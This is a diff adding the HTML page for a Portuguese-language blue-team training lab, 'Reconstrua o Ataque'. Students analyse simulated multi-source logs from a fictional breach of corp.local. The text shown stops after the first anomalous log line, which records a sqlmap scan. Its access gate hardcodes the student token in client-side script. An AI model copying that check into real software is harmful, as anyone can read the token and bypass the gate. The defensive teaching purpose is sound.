@@ -1,0 +1,1237 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" />
+  <meta name="description" content="Blue Team Army — Lab 05: Reconstrua o Ataque. Kill chain com timeline interativa." />
+  <title>LAB 05 — Reconstrua o Ataque | Blue Team Army</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Exo+2:wght@400;600;700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet" />
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --navy:       #0a0e1a;
+      --navy-mid:   #0d1525;
+      --navy-lite:  #111e38;
+      --border:     #1a2a4a;
+      --border2:    #1a3060;
+      --cyan:       #00e5ff;
+      --blue:       #4a9eff;
+      --green:      #00e676;
+      --yellow:     #febc2e;
+      --red:        #ff1744;
+      --orange:     #ff9100;
+      --text:       #c8d8f0;
+      --text-dim:   #a0c4e0;
+      --text-faint: #2a4a7a;
+      --dim:        #8eaac8;
+      --white:      #e8f4ff;
+    }
+
+    html, body { background: var(--navy); color: var(--text); font-family: 'Exo 2', sans-serif; overflow-x: hidden; }
+
+    /* ── Token Gate ──────────────────────────────────────── */
+    #token-gate { display: none; position: fixed; inset: 0; background: var(--navy); z-index: 999; flex-direction: column; align-items: center; justify-content: center; padding: 24px; text-align: center; }
+    .show-gate #token-gate { display: flex; }
+    .tg-logo { margin-bottom: 28px; }
+    .tg-title { font-family: 'Exo 2', sans-serif; font-size: clamp(18px,3.5vw,26px); font-weight: 700; color: var(--white); margin-bottom: 8px; }
+    .tg-sub { font-family: 'Rajdhani', sans-serif; font-size: 14px; color: var(--text-dim); margin-bottom: 28px; }
+    .tg-input { display: block; background: var(--navy-mid); border: 1px solid var(--border); color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 14px; padding: 10px 16px; border-radius: 6px; outline: none; width: 100%; max-width: 340px; text-align: center; letter-spacing: 2px; transition: border-color .2s; margin-bottom: 12px; }
+    .tg-input:focus { border-color: var(--cyan); }
+    .tg-input.tg-shake { border-color: var(--red); animation: tg-shake .3s ease; }
+    @keyframes tg-shake { 0%,100% { transform: translateX(0); } 25% { transform: translateX(-6px); } 75% { transform: translateX(6px); } }
+    .tg-btn { display: block; font-family: 'Rajdhani', sans-serif; font-size: 15px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--cyan); background: rgba(0,229,255,.06); border: 1.5px solid var(--cyan); padding: 10px 32px; border-radius: 6px; cursor: pointer; transition: background .15s; width: 100%; max-width: 340px; margin-bottom: 14px; }
+    .tg-btn:hover { background: rgba(0,229,255,.12); }
+    .tg-err-msg { font-family: 'Share Tech Mono', monospace; font-size: 12px; color: var(--red); min-height: 16px; opacity: 0; transition: opacity .2s; }
+    .tg-err-msg.visible { opacity: 1; }
+
+    /* ── HUD ─────────────────────────────────────────────── */
+    #hud { position: fixed; top: 14px; right: 18px; background: var(--navy-mid); border: 1px solid var(--border2); border-radius: 6px; padding: 6px 14px 7px; z-index: 200; text-align: right; pointer-events: none; box-shadow: 0 2px 16px rgba(0,0,0,.4); }
+    .hud-label { font-family: 'Rajdhani', sans-serif; font-size: 9px; letter-spacing: 1.5px; text-transform: uppercase; color: var(--text-faint); display: block; }
+    .hud-val { font-family: 'Exo 2', sans-serif; font-size: 19px; font-weight: 700; color: var(--cyan); line-height: 1.1; }
+    .hud-val .hud-tot { font-size: 12px; color: var(--dim); font-weight: 400; }
+
+    /* ── Toast ───────────────────────────────────────────── */
+    .flag-toast { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); background: #0b1d3a; border: 2px solid var(--cyan); border-radius: 10px; padding: 24px 34px; text-align: center; z-index: 500; pointer-events: none; min-width: 220px; }
+    .flag-toast.show { display: block; animation: popin .28s ease; }
+    @keyframes popin { from { transform: translate(-50%,-50%) scale(.82); opacity: 0; } to { transform: translate(-50%,-50%) scale(1); opacity: 1; } }
+    .ft-label { font-family: 'Rajdhani', sans-serif; font-size: 12px; color: var(--blue); letter-spacing: 2px; text-transform: uppercase; }
+    .ft-pts { font-family: 'Exo 2', sans-serif; font-size: 32px; color: var(--cyan); font-weight: 700; margin: 6px 0; }
+    .ft-msg { font-size: 12px; color: var(--green); }
+
+    /* ── Page ────────────────────────────────────────────── */
+    .page { min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 24px 16px 60px; gap: 20px; }
+
+    /* ── Header ──────────────────────────────────────────── */
+    .site-header { width: 100%; max-width: 980px; display: flex; align-items: center; justify-content: space-between; padding: 0 4px; }
+    .logo { display: flex; align-items: center; gap: 12px; text-decoration: none; }
+    .logo-hex { width: 40px; height: 40px; flex-shrink: 0; }
+    .logo-text { font-family: 'Exo 2', sans-serif; font-size: 18px; font-weight: 700; color: var(--cyan); letter-spacing: 1.5px; line-height: 1.1; }
+    .logo-sub { font-family: 'Rajdhani', sans-serif; font-size: 11px; color: var(--blue); letter-spacing: 2px; text-transform: uppercase; }
+    .header-link { font-family: 'Rajdhani', sans-serif; font-size: 13px; color: var(--blue); text-decoration: none; border: 1px solid var(--border); padding: 6px 14px; border-radius: 4px; transition: border-color .15s, color .15s; }
+    .header-link:hover { color: var(--cyan); border-color: var(--cyan); }
+
+    /* ── Hero ────────────────────────────────────────────── */
+    .hero { width: 100%; max-width: 980px; text-align: center; padding: 4px 0 2px; }
+    .hero-tag { display: inline-block; font-family: 'Rajdhani', sans-serif; font-size: 11px; letter-spacing: 3px; text-transform: uppercase; color: var(--cyan); border: 1px solid var(--border); padding: 4px 12px; border-radius: 2px; margin-bottom: 12px; }
+    .hero-title { font-family: 'Exo 2', sans-serif; font-size: clamp(22px,4vw,34px); font-weight: 700; color: var(--white); line-height: 1.2; margin-bottom: 6px; }
+    .hero-title span { color: var(--cyan); }
+    .hero-subtitle { font-family: 'Rajdhani', sans-serif; font-size: 13px; color: var(--blue); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 14px; }
+
+    /* Progress steps */
+    .act-progress { display: flex; align-items: center; justify-content: center; gap: 6px; flex-wrap: wrap; }
+    .act-step { display: flex; align-items: center; gap: 6px; padding: 4px 12px; border: 1px solid var(--border); border-radius: 20px; font-family: 'Rajdhani', sans-serif; font-size: 11px; color: var(--text-faint); transition: border-color .3s, color .3s, background .3s; white-space: nowrap; }
+    .act-step--active { border-color: var(--cyan); color: var(--cyan); background: rgba(0,229,255,.06); }
+    .act-step--done   { border-color: var(--green); color: var(--green); background: rgba(0,230,118,.06); }
+    .step-num { width: 16px; height: 16px; border-radius: 50%; border: 1.5px solid currentColor; display: flex; align-items: center; justify-content: center; font-size: 8px; font-weight: 700; flex-shrink: 0; }
+    .act-step--done .step-num::after { content: '✓'; font-size: 8px; }
+    .act-arrow { color: var(--border2); font-size: 12px; }
+
+    /* ── Briefing ─────────────────────────────────────────── */
+    .briefing-card { width: 100%; max-width: 980px; background: var(--navy-mid); border: 1px solid var(--border2); border-left: 4px solid var(--orange); border-radius: 8px; padding: 16px 20px; display: flex; gap: 14px; align-items: flex-start; }
+    .briefing-icon { font-size: 26px; flex-shrink: 0; }
+    .briefing-tag { font-family: 'Rajdhani', sans-serif; font-size: 10px; letter-spacing: 2px; text-transform: uppercase; color: var(--orange); margin-bottom: 6px; font-weight: 700; }
+    .briefing-body { font-family: 'Exo 2', sans-serif; font-size: 14px; color: var(--text-dim); line-height: 1.65; }
+    .briefing-body strong { color: var(--cyan); font-weight: 600; }
+
+    /* ── Etapa wrapper ───────────────────────────────────── */
+    .etapa-wrap { width: 100%; max-width: 980px; }
+    .etapa-card { background: var(--navy-mid); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
+    .etapa-hdr { padding: 11px 18px; background: #080c18; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 12px; }
+    .etapa-num { width: 30px; height: 30px; border-radius: 50%; border: 2px solid var(--cyan); display: flex; align-items: center; justify-content: center; font-family: 'Exo 2', sans-serif; font-size: 14px; font-weight: 700; color: var(--cyan); flex-shrink: 0; transition: border-color .3s, color .3s; }
+    .etapa-num.done { border-color: var(--green); color: var(--green); }
+    .etapa-tag { font-family: 'Rajdhani', sans-serif; font-size: 10px; letter-spacing: 1.5px; text-transform: uppercase; color: var(--dim); }
+    .etapa-title { font-family: 'Exo 2', sans-serif; font-size: 15px; font-weight: 700; color: var(--white); flex: 1; }
+    .etapa-score { font-family: 'Exo 2', sans-serif; font-size: 14px; font-weight: 700; color: var(--cyan); white-space: nowrap; }
+    .etapa-body { padding: 16px; display: flex; gap: 16px; }
+
+    /* Locked etapa */
+    .locked-card { background: var(--navy-mid); border: 1px solid var(--border); border-radius: 10px; padding: 28px; text-align: center; }
+    .locked-icon { font-size: 30px; margin-bottom: 10px; opacity: .5; }
+    .locked-title { font-family: 'Exo 2', sans-serif; font-size: 14px; font-weight: 700; color: var(--dim); margin-bottom: 6px; }
+    .locked-msg { font-family: 'Exo 2', sans-serif; font-size: 13px; color: var(--text-faint); }
+
+    /* Section reveal */
+    .section-wrap { width: 100%; max-width: 980px; opacity: 0; transform: translateY(20px); transition: opacity .5s ease, transform .5s ease; }
+    .section-wrap.visible { opacity: 1; transform: translateY(0); }
+
+    /* ── Checklist ───────────────────────────────────────── */
+    .checklist-col { width: 260px; flex-shrink: 0; }
+    .chk-header { font-family: 'Rajdhani', sans-serif; font-size: 11px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase; color: var(--text-faint); margin-bottom: 8px; }
+    .checklist { display: flex; flex-direction: column; gap: 7px; }
+    .chk-item { display: flex; align-items: flex-start; gap: 9px; padding: 8px 11px; border-radius: 5px; background: var(--navy); border: 1px solid var(--border); transition: all .25s; }
+    .chk-item.done { border-color: var(--green); background: rgba(0,230,118,.06); }
+    .chk-dot { width: 15px; height: 15px; border-radius: 50%; border: 1.5px solid var(--border2); flex-shrink: 0; margin-top: 1px; display: flex; align-items: center; justify-content: center; transition: all .2s; }
+    .chk-item.done .chk-dot { border-color: var(--green); background: var(--green); }
+    .chk-item.done .chk-dot::after { content: '✓'; color: #000; font-size: 8px; font-weight: 900; }
+    .chk-info { flex: 1; min-width: 0; }
+    .chk-text { font-family: 'Exo 2', sans-serif; font-size: 11px; color: var(--text-dim); line-height: 1.4; }
+    .chk-item.done .chk-text { color: var(--green); }
+    .chk-pts { font-family: 'Exo 2', sans-serif; font-size: 11px; font-weight: 700; color: var(--dim); margin-top: 2px; }
+    .chk-item.done .chk-pts { color: var(--green); }
+
+    /* ── Etapa 1: Log viewer ─────────────────────────────── */
+    .main-col { flex: 1; min-width: 0; }
+    .sub-label { font-family: 'Rajdhani', sans-serif; font-size: 11px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase; color: var(--text-faint); margin-bottom: 8px; }
+    .log-viewer { background: #050810; border: 1px solid var(--border); border-radius: 6px; overflow-y: auto; max-height: 300px; }
+    .log-viewer::-webkit-scrollbar { width: 5px; } .log-viewer::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+    .log-line { display: block; font-family: 'Share Tech Mono', monospace; font-size: 10.5px; padding: 3px 12px; line-height: 1.85; white-space: nowrap; cursor: default; transition: background .1s; color: var(--text-dim); }
+    .log-line.clickable { cursor: pointer; }
+    .log-line.clickable:hover { background: rgba(74,158,255,.07); }
+    .log-line.anomalous { color: #f0a080; }
+    .log-line.flagged { background: rgba(0,229,255,.1) !important; color: var(--cyan); }
+    .log-hint { font-family: 'Exo 2', sans-serif; font-size: 11px; color: var(--text-faint); margin-top: 8px; }
+
+    /* ── Etapa 2: Terminal ───────────────────────────────── */
+    .terminal-card { background: #050810; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+    .term-bar { display: flex; align-items: center; gap: 7px; padding: 7px 13px; background: var(--navy-mid); border-bottom: 1px solid var(--border); }
+    .term-dot { width: 9px; height: 9px; border-radius: 50%; }
+    .term-dot-r { background: var(--red); opacity: .8; } .term-dot-y { background: var(--yellow); opacity: .8; } .term-dot-g { background: var(--green); opacity: .8; }
+    .term-bar-title { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--dim); margin-left: 4px; }
+    .term-body { padding: 10px 14px; min-height: 200px; max-height: 320px; overflow-y: auto; font-family: 'Share Tech Mono', monospace; font-size: 11.5px; line-height: 1.7; }
+    .term-body::-webkit-scrollbar { width: 4px; } .term-body::-webkit-scrollbar-thumb { background: var(--border); }
+    .term-out-line { display: block; color: var(--text-dim); }
+    .term-out-line.prompt-line { color: var(--cyan); }
+    .term-out-line.err-line { color: var(--red); }
+    .term-out-line.hi-line { color: #f0a080; }
+    .term-out-line.ok-line { color: var(--green); }
+    .term-input-row { display: flex; align-items: center; padding: 4px 14px 8px; border-top: 1px solid rgba(26,42,74,.6); gap: 6px; }
+    .term-prompt-txt { font-family: 'Share Tech Mono', monospace; font-size: 11.5px; color: var(--cyan); flex-shrink: 0; white-space: nowrap; }
+    .term-input { flex: 1; background: transparent; border: none; outline: none; color: var(--white); font-family: 'Share Tech Mono', monospace; font-size: 11.5px; caret-color: var(--cyan); }
+    .term-hint { margin-top: 8px; font-family: 'Exo 2', sans-serif; font-size: 11px; color: var(--text-faint); }
+
+    /* ── Etapa 3: Event Viewer ───────────────────────────── */
+    .ev-toolbar { display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; align-items: center; }
+    .ev-filter-btn { font-family: 'Rajdhani', sans-serif; font-size: 12px; font-weight: 700; letter-spacing: 1px; padding: 4px 11px; border: 1px solid var(--border); border-radius: 4px; background: transparent; color: var(--dim); cursor: pointer; transition: all .15s; white-space: nowrap; }
+    .ev-filter-btn:hover { border-color: var(--blue); color: var(--blue); }
+    .ev-filter-btn.active { border-color: var(--cyan); color: var(--cyan); background: rgba(0,229,255,.07); }
+    .ev-table-wrap { background: #050810; border: 1px solid var(--border); border-radius: 6px; overflow: hidden; }
+    .ev-table { width: 100%; border-collapse: collapse; }
+    .ev-table th { background: var(--navy-mid); color: var(--text-faint); font-family: 'Rajdhani', sans-serif; font-size: 10px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; padding: 7px 10px; text-align: left; border-bottom: 1px solid var(--border); white-space: nowrap; }
+    .ev-row { border-bottom: 1px solid rgba(26,42,74,.4); cursor: pointer; transition: background .1s; }
+    .ev-row:hover { background: rgba(74,158,255,.06); }
+    .ev-row.selected { background: rgba(0,229,255,.08); }
+    .ev-row td { padding: 7px 10px; font-family: 'Exo 2', sans-serif; font-size: 11px; color: var(--text-dim); vertical-align: middle; white-space: nowrap; }
+    .ev-row td.ev-id { font-family: 'Share Tech Mono', monospace; font-weight: 700; }
+    .ev-row td.ev-desc { white-space: normal; max-width: 220px; line-height: 1.4; }
+    .ev-row.suspicious td.ev-id { color: var(--orange); }
+    .ev-row.critical td.ev-id { color: var(--red); }
+    .ev-detail { display: none; font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--cyan); padding: 6px 10px 8px 36px; background: rgba(0,229,255,.04); border-top: 1px solid rgba(0,229,255,.1); line-height: 1.7; }
+    .ev-row.open + tr .ev-detail { display: block; }
+
+    /* ── Etapa 4: Packet Viewer ──────────────────────────── */
+    .pkt-toolbar { display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; align-items: center; }
+    .pkt-filter-btn { font-family: 'Rajdhani', sans-serif; font-size: 12px; font-weight: 700; letter-spacing: 1px; padding: 4px 11px; border: 1px solid var(--border); border-radius: 4px; background: transparent; color: var(--dim); cursor: pointer; transition: all .15s; }
+    .pkt-filter-btn:hover { border-color: var(--blue); color: var(--blue); }
+    .pkt-filter-btn.active { border-color: var(--cyan); color: var(--cyan); background: rgba(0,229,255,.07); }
+    .pkt-table-wrap { background: #050810; border: 1px solid var(--border); border-radius: 6px; overflow: hidden; max-height: 280px; overflow-y: auto; }
+    .pkt-table-wrap::-webkit-scrollbar { width: 5px; } .pkt-table-wrap::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+    .pkt-table { width: 100%; border-collapse: collapse; }
+    .pkt-table th { background: var(--navy-mid); color: var(--text-faint); font-family: 'Rajdhani', sans-serif; font-size: 10px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; padding: 7px 10px; text-align: left; border-bottom: 1px solid var(--border); white-space: nowrap; position: sticky; top: 0; z-index: 1; }
+    .pkt-row { border-bottom: 1px solid rgba(26,42,74,.4); cursor: pointer; transition: background .1s; }
+    .pkt-row:hover { background: rgba(74,158,255,.06); }
+    .pkt-row.selected { background: rgba(0,229,255,.08); }
+    .pkt-row td { padding: 5px 10px; font-family: 'Share Tech Mono', monospace; font-size: 10.5px; color: var(--text-dim); white-space: nowrap; }
+    .pkt-row td.pkt-info { font-family: 'Exo 2', sans-serif; font-size: 11px; overflow: hidden; text-overflow: ellipsis; max-width: 200px; white-space: nowrap; }
+    .proto-dns { color: #7fd4e8; }
+    .proto-http { color: #a0c864; }
+    .proto-https { color: #80d4a0; }
+    .proto-tcp { color: var(--dim); }
+    .pkt-anomalous td { color: #f0a080; }
+    .pkt-detail-row { display: none; }
+    .pkt-row.open + .pkt-detail-row { display: table-row; }
+    .pkt-detail-cell { padding: 8px 10px 10px 36px; background: rgba(0,229,255,.04); border-top: 1px solid rgba(0,229,255,.08); font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--cyan); line-height: 1.8; }
+
+    /* ── Timeline Section ────────────────────────────────── */
+    .tl-card { background: var(--navy-mid); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
+    .tl-hdr { padding: 12px 18px; background: #080c18; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 12px; }
+    .tl-hdr-icon { font-size: 22px; }
+    .tl-hdr-title { font-family: 'Exo 2', sans-serif; font-size: 16px; font-weight: 700; color: var(--white); flex: 1; }
+    .tl-hdr-pts { font-family: 'Exo 2', sans-serif; font-size: 14px; font-weight: 700; color: var(--cyan); }
+    .tl-body { padding: 16px; }
+    .tl-instructions { font-family: 'Exo 2', sans-serif; font-size: 13px; color: var(--text-dim); margin-bottom: 16px; line-height: 1.6; }
+    .tl-instructions strong { color: var(--cyan); }
+
+    .tl-list { display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px; min-height: 60px; }
+    .tl-item { display: flex; align-items: center; gap: 12px; padding: 12px 14px; background: var(--navy); border: 1px solid var(--border); border-radius: 7px; cursor: grab; user-select: none; transition: border-color .15s, background .15s, box-shadow .15s; }
+    .tl-item:hover { border-color: var(--blue); background: rgba(74,158,255,.05); }
+    .tl-item.dragging { opacity: .4; cursor: grabbing; box-shadow: 0 4px 20px rgba(0,0,0,.5); }
+    .tl-item.drag-over-top { border-top: 2px solid var(--cyan); }
+    .tl-item.drag-over-bot { border-bottom: 2px solid var(--cyan); }
+    .tl-item.correct { border-color: var(--green); background: rgba(0,230,118,.08); }
+    .tl-item.wrong { border-color: var(--red); background: rgba(255,23,68,.06); }
+    .tl-drag-handle { color: var(--text-faint); font-size: 14px; flex-shrink: 0; cursor: grab; }
+    .tl-pos { width: 24px; height: 24px; border-radius: 50%; border: 1.5px solid var(--border2); display: flex; align-items: center; justify-content: center; font-family: 'Exo 2', sans-serif; font-size: 11px; font-weight: 700; color: var(--dim); flex-shrink: 0; }
+    .tl-icon { font-size: 16px; flex-shrink: 0; }
+    .tl-text { font-family: 'Exo 2', sans-serif; font-size: 13px; font-weight: 600; color: var(--text); flex: 1; }
+    .tl-phase { font-family: 'Rajdhani', sans-serif; font-size: 10px; letter-spacing: 1px; text-transform: uppercase; padding: 2px 7px; border-radius: 3px; flex-shrink: 0; white-space: nowrap; }
+    .phase-recon { background: rgba(254,188,46,.1); border: 1px solid rgba(254,188,46,.3); color: var(--yellow); }
+    .phase-access { background: rgba(255,145,0,.1); border: 1px solid rgba(255,145,0,.3); color: var(--orange); }
+    .phase-persist { background: rgba(255,23,68,.1); border: 1px solid rgba(255,23,68,.3); color: var(--red); }
+    .phase-c2 { background: rgba(74,158,255,.1); border: 1px solid rgba(74,158,255,.3); color: var(--blue); }
+    .phase-exfil { background: rgba(0,229,255,.1); border: 1px solid rgba(0,229,255,.3); color: var(--cyan); }
+
+    .tl-actions { display: flex; gap: 10px; align-items: center; }
+    .btn-confirm-tl { font-family: 'Rajdhani', sans-serif; font-size: 15px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--cyan); background: rgba(0,229,255,.08); border: 1.5px solid var(--cyan); border-radius: 6px; padding: 10px 24px; cursor: pointer; transition: background .15s; }
+    .btn-confirm-tl:hover { background: rgba(0,229,255,.16); }
+    .btn-confirm-tl:disabled { opacity: .4; cursor: not-allowed; }
+    .btn-shuffle { font-family: 'Rajdhani', sans-serif; font-size: 13px; font-weight: 700; letter-spacing: 1px; color: var(--dim); background: transparent; border: 1px solid var(--border); border-radius: 5px; padding: 8px 16px; cursor: pointer; transition: all .15s; }
+    .btn-shuffle:hover { border-color: var(--blue); color: var(--blue); }
+    .tl-result { margin-top: 14px; padding: 14px; border-radius: 6px; }
+    .tl-result.ok  { background: rgba(0,230,118,.08);  border: 1px solid rgba(0,230,118,.3); }
+    .tl-result.par { background: rgba(254,188,46,.08); border: 1px solid rgba(254,188,46,.3); }
+    .tl-result.err { background: rgba(255,23,68,.08);  border: 1px solid rgba(255,23,68,.3); }
+    .tl-result-title { font-family: 'Exo 2', sans-serif; font-size: 15px; font-weight: 700; margin-bottom: 8px; }
+    .tl-result.ok  .tl-result-title { color: var(--green); }
+    .tl-result.par .tl-result-title { color: var(--yellow); }
+    .tl-result.err .tl-result-title { color: var(--red); }
+    .tl-result-body { font-family: 'Exo 2', sans-serif; font-size: 13px; color: var(--text-dim); line-height: 1.6; }
+
+    /* ── Closing ─────────────────────────────────────────── */
+    .closing-card { background: var(--navy-mid); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
+    .closing-hdr { padding: 16px 20px; background: #080c18; border-bottom: 1px solid var(--border); display: flex; gap: 14px; align-items: flex-start; }
+    .closing-icon { font-size: 30px; flex-shrink: 0; }
+    .closing-title { font-family: 'Exo 2', sans-serif; font-size: 17px; font-weight: 700; color: var(--white); margin-bottom: 4px; }
+    .closing-sub { font-family: 'Rajdhani', sans-serif; font-size: 14px; color: var(--text-dim); }
+    .closing-body { padding: 20px; }
+    .killchain-narrative { font-family: 'Exo 2', sans-serif; font-size: 14px; color: var(--text-dim); line-height: 1.75; background: #050810; border-left: 3px solid var(--orange); border-radius: 0 6px 6px 0; padding: 14px 18px; margin-bottom: 20px; }
+    .killchain-narrative p { margin-bottom: 10px; } .killchain-narrative p:last-child { margin-bottom: 0; }
+    .killchain-narrative strong { color: var(--cyan); font-weight: 600; }
+    .lc-banner { background: var(--navy); border: 2px solid var(--cyan); border-radius: 10px; padding: 28px; text-align: center; }
+    .lc-icon { font-size: 36px; margin-bottom: 8px; }
+    .lc-title { font-family: 'Exo 2', sans-serif; font-size: 24px; font-weight: 700; color: var(--cyan); margin-bottom: 6px; }
+    .lc-score { font-family: 'Exo 2', sans-serif; font-size: 40px; font-weight: 700; color: var(--yellow); margin-bottom: 10px; letter-spacing: 2px; }
+    .lc-msg { font-family: 'Rajdhani', sans-serif; font-size: 15px; color: var(--text-dim); max-width: 500px; margin: 0 auto; line-height: 1.6; }
+    .lc-back { display: inline-block; margin-top: 20px; font-family: 'Rajdhani', sans-serif; font-size: 14px; font-weight: 700; letter-spacing: 1px; color: var(--green); background: transparent; border: 1px solid var(--green); padding: 10px 28px; border-radius: 5px; text-decoration: none; transition: background .15s; }
+    .lc-back:hover { background: rgba(0,230,118,.08); }
+
+    /* ── Footer ──────────────────────────────────────────── */
+    .site-footer { width: 100%; max-width: 980px; border-top: 1px solid var(--border); padding-top: 20px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
+    .footer-text { font-family: 'Rajdhani', sans-serif; font-size: 12px; color: var(--text-faint); }
+    .footer-link { font-family: 'Rajdhani', sans-serif; font-size: 12px; color: var(--blue); text-decoration: none; }
+    .footer-link:hover { color: var(--cyan); }
+
+    @media (max-width: 640px) {
+      .header-link { display: none; }
+      .etapa-body { flex-direction: column; }
+      .checklist-col { width: 100%; }
+      #hud { top: auto; bottom: 14px; right: 14px; }
+      .tl-phase { display: none; }
+    }
+  </style>
+
+  <script>
+    if (localStorage.getItem('bta-lab05-access') === 'BTA-LAB05-2026') {
+      document.documentElement.classList.remove('show-gate');
+    } else {
+      document.documentElement.classList.add('show-gate');
+    }
+  </script>
+</head>
+<body>
+
+<!-- Token Gate -->
+<div id="token-gate" role="dialog" aria-modal="true">
+  <div class="tg-logo">
+    <svg viewBox="0 0 40 46" width="52" height="60" fill="none">
+      <path d="M20 1L38 11V35L20 45L2 35V11L20 1Z" stroke="#00e5ff" stroke-width="1.5" fill="none"/>
+      <path d="M20 8L33 15.5V30.5L20 38L7 30.5V15.5L20 8Z" fill="#0d1525" stroke="#1a3060" stroke-width="1"/>
+      <text x="20" y="27" text-anchor="middle" font-family="'Exo 2',sans-serif" font-size="11" font-weight="700" fill="#00e5ff">BTA</text>
+    </svg>
+  </div>
+  <h1 class="tg-title">LAB 05 — Acesso Restrito</h1>
+  <p class="tg-sub">Este lab é exclusivo para alunos matriculados.</p>
+  <input type="text" id="token-input" class="tg-input" placeholder="Digite seu token de acesso" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" />
+  <button type="button" id="token-btn" class="tg-btn">Acessar Lab</button>
+  <p class="tg-err-msg" id="token-err">Token inválido.</p>
+</div>
+
+<!-- HUD -->
+<div id="hud">
+  <span class="hud-label">Pontuação</span>
+  <div class="hud-val"><span id="hud-pts">0</span> <span class="hud-tot">/ 1000 pts</span></div>
+</div>
+
+<!-- Toast -->
+<div class="flag-toast" id="flag-toast">
+  <div class="ft-label" id="toast-label">🔍 Descoberta!</div>
+  <div class="ft-pts" id="toast-pts">+50 pts</div>
+  <div class="ft-msg" id="toast-msg"></div>
+</div>
+
+<div class="page">
+
+  <!-- Header -->
+  <header class="site-header">
+    <a class="logo" href="#">
+      <svg class="logo-hex" viewBox="0 0 40 46" fill="none" aria-hidden="true">
+        <path d="M20 1L38 11V35L20 45L2 35V11L20 1Z" stroke="#00e5ff" stroke-width="1.5" fill="none"/>
+        <path d="M20 8L33 15.5V30.5L20 38L7 30.5V15.5L20 8Z" fill="#0d1525" stroke="#1a3060" stroke-width="1"/>
+        <text x="20" y="27" text-anchor="middle" font-family="'Exo 2',sans-serif" font-size="11" font-weight="700" fill="#00e5ff">BTA</text>
+      </svg>
+      <div>
+        <div class="logo-text">BLUE TEAM ARMY</div>
+        <div class="logo-sub">Training Lab</div>
+      </div>
+    </a>
+    <a class="header-link" href="https://blueteam.army" target="_blank" rel="noopener">blueteam.army &rarr;</a>
+  </header>
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="hero-tag">Módulo 5 · Análise de Logs e Detecção de Ataques</div>
+    <h1 class="hero-title">LAB 05 — <span>Reconstrua o Ataque</span></h1>
+    <p class="hero-subtitle">Análise multi-fonte · Kill chain completa</p>
+    <div class="act-progress">
+      <div class="act-step act-step--active" id="prog-1"><span class="step-num">1</span>Reconhecimento</div>
+      <div class="act-arrow">→</div>
+      <div class="act-step" id="prog-2"><span class="step-num">2</span>Acesso Inicial</div>
+      <div class="act-arrow">→</div>
+      <div class="act-step" id="prog-3"><span class="step-num">3</span>Persistência</div>
+      <div class="act-arrow">→</div>
+      <div class="act-step" id="prog-4"><span class="step-num">4</span>Exfiltração</div>
+      <div class="act-arrow">→</div>
+      <div class="act-step" id="prog-5"><span class="step-num">5</span>Timeline</div>
+    </div>
+  </section>
+
+  <!-- Briefing -->
+  <div class="briefing-card">
+    <div class="briefing-icon">⚠️</div>
+    <div>
+      <div class="briefing-tag">Briefing de Incidente</div>
+      <div class="briefing-body">
+        Um <strong>ataque coordenado</strong> atingiu a rede corp.local na madrugada de 08/11/2024.<br>
+        Você tem acesso a logs de <strong>múltiplas fontes</strong>: web, SSH, Windows Events e tráfego de rede.<br>
+        Missão: identificar cada etapa do ataque e <strong>reconstruir a kill chain completa</strong>.
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!-- ETAPA 1 — Reconhecimento                              -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <div class="etapa-wrap" id="et1-wrap">
+    <div class="etapa-card">
+      <div class="etapa-hdr">
+        <div class="etapa-num" id="et1-num">1</div>
+        <div>
+          <div class="etapa-tag">Etapa 1</div>
+          <div class="etapa-title">Reconhecimento</div>
+        </div>
+        <div class="etapa-score" id="et1-score">0 / 200 pts</div>
+      </div>
+      <div class="etapa-body">
+        <div class="main-col">
+          <div class="sub-label">Access Log — servidor web corp.local</div>
+          <div class="log-viewer" id="et1-log">
+            <span class="log-line" data-type="normal">10.15.3.44 - - [08/Nov/2024:01:55:12] "GET /index.html HTTP/1.1" 200 4523 "Mozilla/5.0 (Windows NT 10.0)"</span>
+            <span class="log-line" data-type="normal">10.15.3.44 - - [08/Nov/2024:01:56:03] "GET /about.html HTTP/1.1" 200 3219 "Mozilla/5.0 (Windows NT 10.0)"</span>
+            <span class="log-line" data-type="normal">10.15.3.44 - - [08/Nov/2024:01:57:22] "GET /contact.html HTTP/1.1" 200 2981 "Mozilla/5.0 (Windows NT 10.0)"</span>
+            <span class="log-line clickable anomalous" data-type="scanner,ip">10.20.45.113 - - [08/Nov/2024:02:00:01] "GET / HTTP/1.1" 200 4523 "sqlmap/1.7.8#stable"</span>
